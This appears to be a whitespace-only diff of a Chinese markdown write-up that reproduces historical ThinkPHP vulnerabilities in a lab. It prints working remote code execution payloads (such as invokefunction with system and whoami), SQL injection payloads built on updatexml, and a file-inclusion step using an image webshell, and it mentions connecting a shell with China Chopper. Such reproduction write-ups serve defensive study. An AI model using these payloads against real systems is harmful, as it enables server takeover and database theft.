@@ -9,27 +9,27 @@ source: "MrWQ/vulnerability-paper"
 
 ThinkPHP 是一个快速、简单的基于 MVC 和面向对象的轻量级 PHP 开发框架，遵循 Apache2 开源协议发布。ThinkPHP 从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重开发体验和易用性，为 WEB 应用和 API 开发提供了强有力的支持。
 
-  **0x00 前言**  
+  **0x00 前言**  
 本篇文章将针对 ThinkPHP 的历史漏洞进行整理复现，今后爆出的 ThinkPHP 漏洞，也将进行补充更新。
 
-  **0x01ThinkPHP 远程命令执行 / 代码执行漏洞**
+  **0x01ThinkPHP 远程命令执行 / 代码执行漏洞**
 
-  **一，ThinkPHP 5.0.23 远程代码执行**  
+  **一，ThinkPHP 5.0.23 远程代码执行**  
 **漏洞介绍**  
 2019 年 1 月 11 日，360CERT 发现某安全社区出现关于 ThinkPHP5 RCE 漏洞的威胁情报，不久之后 ThinkPHP5 官方与 GitHub 发布更新。该更新修复了一处严重漏洞，该漏洞可导致远程命令代码执行。  
 Thinkphp 在实现框架中的核心类 Request 的 method 方法实现了表单请求伪装。但由于对 $_POST[‘_method’] 属性校验不严格，导致攻击者可以通过变量覆盖掉 Request 类的属性并结合框架特性实现对任意函数的调用，从而实现远程代码执行。
 
-  **影响版本**  
+  **影响版本**  
 THINKPHP 5.0.x-5.0.23
 
-  **漏洞分析参考：**  
+  **漏洞分析参考：**  
 https://www.freebuf.com/vuls/194093.html
 
-  **漏洞复现（内网环境）**  
+  **漏洞复现（内网环境）**  
 访问 192.168.10.53，选择对应版本  
 需要目标开启 debug 模式
 
-  **Poc/exp:**  
+  **Poc/exp:**  
 设置 url 参数 s=captcha，post 数据
 
 ```
@@ -38,22 +38,22 @@ _method=__construct&filter=system&method=get&server[REQUEST_METHOD]=whoami
 
 [![](http://zone.secevery.com/uploads/article/20191220/02b59cfc58d675df0a9e6a6504b4ecf4.png)](http://zone.secevery.com/uploads/article/20191220/02b59cfc58d675df0a9e6a6504b4ecf4.png)
 
-  **二，ThinkPHP 5.0.22 远程代码执行**  
+  **二，ThinkPHP 5.0.22 远程代码执行**  
 **漏洞介绍**  
 2018 年 12 月 9 日，ThinkPHP 官方发布安全更新，修复一处由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的 getshell 漏洞，受影响的版本包括 5.0 和 5.1 版本，山石网科安服团队经过分析，把该漏洞危险级别定为严重。  
 Thinkphp5.x 版本 (5.0.20) 中没有对路由中的控制器进行严格过滤，在存在 admin、index 模块、没有开启强制路由的条件下（默认不开启），导致可以注入恶意代码利用反射类调用命名空间其他任意内置类，完成远程代码执行
 
-  **影响版本**  
+  **影响版本**  
 THINKPHP 5.0.5-5.0.22  
 THINKPHP 5.1.0-5.1.30
 
-  **漏洞分析参考：**  
+  **漏洞分析参考：**  
 https://www.secpulse.com/archives/93903.html
 
-  **漏洞复现（内网环境）**  
+  **漏洞复现（内网环境）**  
 访问 192.168.10.53，选择对应版本
 
-  **命令执行 payload：**
+  **命令执行 payload：**
 
 ```
 ?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1]=whoami
@@ -77,14 +77,14 @@ https://www.secpulse.com/archives/93903.html
 
 [![](http://zone.secevery.com/uploads/article/20191220/a4180480316757a4e222fb666b755f9e.png)](http://zone.secevery.com/uploads/article/20191220/a4180480316757a4e222fb666b755f9e.png)
 
-  **三，​ThinkPHP 2.2 任意代码执行**  
+  **三，ThinkPHP 2.2 任意代码执行**  
 **影响版本**  
 THINKPHP 2.x-2.2
 
 **漏洞复现（内网环境）**  
 访问 192.168.10.53，选择对应版本
 
-  **Poc/exp:**
+  **Poc/exp:**
 
 ```
 /module/action/param1/${phpinfo()}
@@ -96,7 +96,7 @@ THINKPHP 2.x-2.2
 
 [![](http://zone.secevery.com/uploads/article/20191220/87fe7fd2082ba68d27b7353f44e5aa87.png)](http://zone.secevery.com/uploads/article/20191220/87fe7fd2082ba68d27b7353f44e5aa87.png)
 
-  **getshell 菜刀直接连接构造的连接**
+  **getshell 菜刀直接连接构造的连接**
 
 [![](http://zone.secevery.com/uploads/article/20191220/813d568f9483ae9fbc84e83b17eeea81.png)](http://zone.secevery.com/uploads/article/20191220/813d568f9483ae9fbc84e83b17eeea81.png)
 
@@ -104,17 +104,17 @@ THINKPHP 2.x-2.2
 
 **0x02ThinkPHP sql 注入漏洞**
 
-  **一，ThinkPHP 3.2.3/5.1.22 order by 注入**  
+  **一，ThinkPHP 3.2.3/5.1.22 order by 注入**  
 **漏洞介绍：**  
 该漏洞是因为未正确处理所接收数组类型参数的 key，直接拼接到了 SQL 语句的 order by 后面，导致漏洞的产生。该漏洞可以获取数据库数据，比如用户账号密码，管理后台账号密码，交易数据等。漏洞危害为高危。
 
-  **影响版本**  
+  **影响版本**  
 5.1.16<=ThinkPHP<=5.1.22，<=3.2.3
 
-  **漏洞分析参考：**  
+  **漏洞分析参考：**  
 https://nosec.org/home/detail/1821.html
 
-  **漏洞复现（内网环境）**  
+  **漏洞复现（内网环境）**  
 **在 / application/index/controller / 文件夹下建立 Index.php 文件，内容如下：**
 
 ```
@@ -145,11 +145,11 @@ class Index{
 
 **访问 192.168.10.53，选择对应版本**
 
-  **Poc/exp:**  
+  **Poc/exp:**  
 **3.2.3**
 
 ```
-?order[updatexml(1,concat(0x3a,user()),1)]=1            
+?order[updatexml(1,concat(0x3a,user()),1)]=1            
 ```
 
 **5.1.22** 
@@ -167,7 +167,7 @@ Thinkphp<=3.2.3
 **漏洞分析参考：**  
 https://www.anquanke.com/post/id/157817
 
-  **漏洞复现（内网环境）**  
+  **漏洞复现（内网环境）**  
 **在 Application\Home\Controller\IndexController.class.php 添加以下代码:**
 
 ```
@@ -232,14 +232,14 @@ http://192.168.10.53/web/3.2.3/index.php?m=Home&c=Index&a=test&id[table]=user%20
 
 [![](http://zone.secevery.com/uploads/article/20191220/50ff54ea3e1a44f4be2dfba634b82aaf.png)](http://zone.secevery.com/uploads/article/20191220/50ff54ea3e1a44f4be2dfba634b82aaf.png)
 
-  **三，ThinkPHP 框架 3.2.3 update 注入漏洞**  
+  **三，ThinkPHP 框架 3.2.3 update 注入漏洞**  
 **影响版本**  
 Thinkphp<=3.2.3
 
-  **漏洞分析参考：**  
+  **漏洞分析参考：**  
 https://www.seebug.org/vuldb/ssvid-97234
 
-  **漏洞复现（内网环境）**  
+  **漏洞复现（内网环境）**  
 **在 Application/Home/Controller/UserController.class.php 添加以下代码:**
 
 ```
@@ -286,17 +286,17 @@ class UserController extends Controller {
 
 [![](http://zone.secevery.com/uploads/article/20191220/d1cc9e98eaec43f46e0f6b13113349f5.png)](http://zone.secevery.com/uploads/article/20191220/d1cc9e98eaec43f46e0f6b13113349f5.png)
 
-  **四，ThinkPHP 5.1.7 update 注入**  
+  **四，ThinkPHP 5.1.7 update 注入**  
 **漏洞介绍**  
 本次漏洞存在于 Mysql 类的 parseArrayData 方法中由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL 注入漏洞 的产生。
 
-  **影响版本**  
+  **影响版本**  
 5.1.6<=Thinkphp<=5.1.7(非最新的 5.1.8 版本也可利用)
 
-  **漏洞分析参考：**  
+  **漏洞分析参考：**  
 https://www.freebuf.com/column/206233.html
 
-  **漏洞复现（内网环境）**  
+  **漏洞复现（内网环境）**  
 **在 \ thinkphp\application\index\controller\Index.php 添加以下代码:**
 
 ```
@@ -325,17 +325,17 @@ class index
 
 [![](http://zone.secevery.com/uploads/article/20191220/d53c716a02ce8753e3e1513915ad17fa.png)](http://zone.secevery.com/uploads/article/20191220/d53c716a02ce8753e3e1513915ad17fa.png)
 
-  **五，ThinkPHP 5.0.15 insert 注入**  
+  **五，ThinkPHP 5.0.15 insert 注入**  
 **漏洞介绍**  
 本次漏洞存在于 Builder 类的 parseData 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL 注入漏洞 的产生。
 
-  **影响版本**  
+  **影响版本**  
 5.0.13<Thinkphp<=5.0.15，5.1.0<=thinkphp<=5.1.5
 
-  **漏洞分析参考：**  
+  **漏洞分析参考：**  
 https://www.freebuf.com/column/205976.html
 
-  **漏洞复现（内网环境）**  
+  **漏洞复现（内网环境）**  
 **在 \ thinkphp\application\index\controller\Index.php 添加以下代码:**
 
 ```
@@ -366,17 +366,17 @@ class Index
 
 [![](http://zone.secevery.com/uploads/article/20191220/ea842a59a0b267116f44988731990116.png)](http://zone.secevery.com/uploads/article/20191220/ea842a59a0b267116f44988731990116.png)
 
-  **六，ThinkPHP5 select 注入**  
+  **六，ThinkPHP5 select 注入**  
 **漏洞介绍**  
 本次漏洞存在于 Mysql 类的 parseWhereItem 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL 注入漏洞 的产生。
 
-  **影响版本**  
+  **影响版本**  
 ThinkPHP5 全版本
 
-  **漏洞分析参考：**  
+  **漏洞分析参考：**  
 https://www.freebuf.com/column/206387.html
 
-  **漏洞复现（内网环境**）  
+  **漏洞复现（内网环境**）  
 **在 \ thinkphp\application\index\controller\Index.php 添加以下代码:**
 
 ```
@@ -407,17 +407,17 @@ class Index
 
 [![](http://zone.secevery.com/uploads/article/20191220/a3625cb2e2543725301af1de996438c4.png)](http://zone.secevery.com/uploads/article/20191220/a3625cb2e2543725301af1de996438c4.png)
 
-  **七，ThinkPHP5.0.10 select 注入**  
+  **七，ThinkPHP5.0.10 select 注入**  
 **漏洞介绍**  
 本次漏洞存在于 Mysql 类的 parseWhereItem 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句。再一个， Request 类的 filterValue 方法漏过滤 NOT LIKE 关键字，最终导致 SQL 注入漏洞 的产生。
 
-  **影响版本**  
+  **影响版本**  
 ThinkPHP 5.0.10
 
-  **漏洞分析参考：**  
+  **漏洞分析参考：**  
 https://www.freebuf.com/column/206599.html
 
-  **漏洞复现（内网环境）**  
+  **漏洞复现（内网环境）**  
 **在 \ thinkphp\application\index\controller\Index.php 添加以下代码:**
 
 ```
@@ -448,17 +448,17 @@ class Index
 
 [![](http://zone.secevery.com/uploads/article/20191220/d48c037742188d28c9e2f29a0b788763.png)](http://zone.secevery.com/uploads/article/20191220/d48c037742188d28c9e2f29a0b788763.png)
 
-  **八，ThinkPHP Mysql 聚合函数相关方法注入  
+  **八，ThinkPHP Mysql 聚合函数相关方法注入  
 漏洞介绍**  
 本次漏洞存在于所有 Mysql 聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句，最终导致 SQL 注入漏洞 的产生。
 
-  **影响版本**   
+  **影响版本**   
 5.0.0<=ThinkPHP<=5.0.21 、 5.1.3<=ThinkPHP5<=5.1.25 。
 
-  **漏洞分析参考：**  
+  **漏洞分析参考：**  
 https://www.freebuf.com/column/206599.html
 
-  **漏洞复现（内网环境）**  
+  **漏洞复现（内网环境）**  
 **在 \ thinkphp\application\index\controller\Index.php 添加以下代码:**
 
 ```
@@ -497,19 +497,19 @@ class Index
 
 [![](http://zone.secevery.com/uploads/article/20191220/939d6f3e1692fbbf6c6cc00a6a427fe0.png)](http://zone.secevery.com/uploads/article/20191220/939d6f3e1692fbbf6c6cc00a6a427fe0.png)
 
-  **0x03ThinkPHP 文件包含漏洞**
+  **0x03ThinkPHP 文件包含漏洞**
 
-  **一，ThinkPHP5 文件包含漏洞**  
+  **一，ThinkPHP5 文件包含漏洞**  
 **漏洞介绍**  
 本次漏洞存在于 ThinkPHP 模板引擎中，在加载模版解析变量时存在变量覆盖问题，而且程序没有对数据进行很好的过滤，最终导致文件包含漏洞的产生。
 
-  **影响版本**   
+  **影响版本**   
 5.0.0<=ThinkPHP5<=5.0.18、5.1.0<=ThinkPHP<=5.1.10
 
-  **漏洞分析参考：**  
+  **漏洞分析参考：**  
 https://www.freebuf.com/column/207878.html
 
-  **漏洞复现（内网环境）**  
+  **漏洞复现（内网环境）**  
 **在 \ thinkphp\application\index\controller\Index.php 添加以下代码:**
 
 ```
@@ -532,7 +532,7 @@ class Index
 
 创建 application/index/view/index/index.html 文件，内容随意（没有这个模板文件的话，在渲染时程序会报错），并将图片马 1.jpg 放至 public 目录下（模拟上传图片操作）。
 
-  **Poc/exp:**
+  **Poc/exp:**
 
 ```
 /index.php/index/index/index?cacheFile=1.jpg
